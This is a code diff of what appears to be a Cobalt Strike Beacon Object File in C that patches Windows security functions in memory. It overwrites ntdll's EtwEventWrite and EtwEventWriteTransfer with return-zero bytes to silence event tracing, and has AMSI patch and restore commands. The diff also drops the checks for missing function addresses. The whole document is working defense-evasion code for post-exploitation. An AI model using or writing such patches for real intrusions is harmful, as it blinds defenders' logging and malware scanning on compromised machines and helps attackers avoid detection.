@@ -61,8 +61,7 @@ void go(char* args, int len) {
     void* p_etwW = (void*)KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
     void* p_etwT = (void*)KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("ntdll.dll"), "EtwEventWriteTransfer");
 
-    unsigned char p_ret[] = { 0xC3 };
-    
+    unsigned char p_ret[] = { 0x48, 0x33, 0xC0, 0xC3 };    
     // Original bytes for restoring
     unsigned char o_amsi[] = { 0x4C, 0x8B, 0xDC, 0x49, 0x89, 0x5B, 0x08, 0x49, 0x89, 0x6B, 0x10, 0x49, 0x89, 0x73, 0x18 };
     unsigned char o_etwW[] = { 0x4C, 0x8B, 0xDC, 0x48, 0x83, 0xEC, 0x58, 0x4D, 0x89, 0x4B, 0xE8, 0x33, 0xC0 };
@@ -74,19 +73,9 @@ void go(char* args, int len) {
         ApplyPatch(p_amsi, o_amsi, sizeof(o_amsi), " AMSI Restored.");
     } 
     if (cmd == 3) {
-        // ONLY patch if the address was found!
-        if (p_etwW != NULL) {
-            ApplyPatch(p_etwW, p_ret, sizeof(p_ret), "[+] EtwEventWrite Patched.");
-        } else {
-            BeaconPrintf(0, "[!] Could not find EtwEventWrite");
+            ApplyPatch(p_etwW, p_ret, sizeof(p_ret), " EtwEventWrite Patched.");
+            ApplyPatch(p_etwT, p_ret, sizeof(p_ret), " EtwEventWriteTransfer Patched.");
         }
-
-        if (p_etwT != NULL) {
-            ApplyPatch(p_etwT, p_ret, sizeof(p_ret), "[+] EtwEventWriteTransfer Patched.");
-        } else {
-            BeaconPrintf(0, "[!] Could not find EtwEventWriteTransfer");
-        }
-    }
     else if (cmd == 4) {
         ApplyPatch(p_etwW, o_etwW, sizeof(o_etwW), " ETW Restored.");
         ApplyPatch(p_etwT, o_etwT, sizeof(o_etwT), " ETW Transfer Restored.");
